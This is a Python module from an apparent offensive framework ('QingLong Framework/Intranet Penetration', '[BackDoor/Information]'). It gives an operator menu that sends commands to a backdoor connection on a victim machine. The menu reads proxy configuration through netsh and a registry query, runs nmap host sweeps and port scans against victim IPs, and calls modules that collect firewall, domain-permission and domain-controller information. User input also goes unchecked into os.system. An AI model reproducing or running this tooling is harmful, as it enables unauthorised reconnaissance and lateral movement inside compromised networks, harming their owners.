from prettytable import PrettyTable

import os
import sys
import struct
from prompt_toolkit import prompt
from prompt_toolkit.completion import WordCompleter
from prompt_toolkit.formatted_text import ANSI

sys.path.append(os.path.dirname(os.path.realpath(__file__)))
import GeneralInformation
import SpecificInformation
import PermissionQuery
import LocatingDomainControllers
from AuxiliaryFunctions import MyTable


class information:
    def __init__(self, conn):
        commands = ["back", "show params", "show functions"]
        completer = WordCompleter(commands)
        formatted_text1 = ANSI(
            '\033[1;32;32m(QingLong Framework/Intranet Penetration)-\033[0m\033[1;31;31m[BackDoor/Information] \033[0m')
        while True:
            try:
                choice = prompt(formatted_text1, completer=completer)
                if choice.lower() == 'show functions':
                    self.show_functions()
                    continue
                elif choice == "":
                    continue
                elif choice == 'back':
                    break
                elif choice == 'show params':
                    self.show_params()
                    continue
                elif choice == '1':
                    GeneralInformation.General_Information(conn)
                    continue
                elif choice == '2':
                    SpecificInformation.SpecificInformation(conn)
                    continue
                elif choice == '3':
                    command = "netsh winhttp show proxy"
                    self.receive(conn, command)
                    command0 = "reg query \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" | findstr /i \"proxyserver\""
                    self.receive(conn, command0)
                    continue
                elif choice.split()[0] == '4':
                    command = "nmap -sP " + choice.split()[1]
                    os.system(command)
                    continue
                elif choice == '5':
                    PermissionQuery.PermissionQuery(conn)
                    continue
                elif choice.split()[0] == '6':
                    command = "nmap {}".format(choice.split()[1])
                    os.system(command)
                    continue
                elif choice == '7':
                    LocatingDomainControllers.Locating_Domain_Controllers(conn)
                    continue
            except IndexError:
                print('\033[1;31;31m' + "[-] You need to offer other params." + '\033[0m')
                continue

    def receive(self, conn, command):
        conn.sendall(command.encode("gbk"))
        result_len = conn.recv(4)
        real_len = struct.unpack("i", result_len)[0]
        while True:
            if 1024 < real_len:
                result = conn.recv(1024).decode("gbk", errors="ignore")
                print(result)
                real_len = real_len - 1024
                continue
            else:
                result = conn.recv(1024).decode("gbk", errors="ignore")
                print(result)
                break

    def show_params(self):
        print("\n" + '\033[1;34;34m' + "Parameter Description" + '\033[0m' + "\n" + '=' * len(
            "Parameter Description") + "\n")
        headers = ['\033[1;34;34m' + "Params" + '\033[0m', '\033[1;34;34m' + "Description" + '\033[0m']
        mydata = [["victim_ip", "受害者IP"], ["victim_ip_network_segment", "受害者主机网段.格式举例：192.168.88.1.0/24"]]
        MyTable.createTable(headers, mydata)

    def show_functions(self):
        print("\n" + '\033[1;34;34m' + "Domain Information Collection" + '\033[0m' + "\n" + '=' * len(
            "Domain Information Collection") + "\n")
        headers = ['\033[1;34;34m' + "id" + '\033[0m', '\033[1;34;34m' + "model", '\033[1;34;34m' + "usage",
                   '\033[1;34;34m' + "description" + '\033[0m']
        mydata = [["1", "General Information Query", "1", "通用信息查询"],
                  ["2", "Firewall Information Query", "2", "防火墙信息查询"],
                  ["3", "View Agent Configuration Status", "3", "查看代理配置情况"],
                  ["4", "Detect Domain Survival Hosts", "4 victim_ip_network_segment", "探测域内存活主机"],
                  ["5", "Domain Information Query", "5", "域信息查询"],
                  ["6", "Port Scanning", "6 victim_ip", "端口扫描"],
                  ["7", "Locating Domain Controllers", "7", "域控制器定位"]]
        MyTable.createTable(headers, mydata)
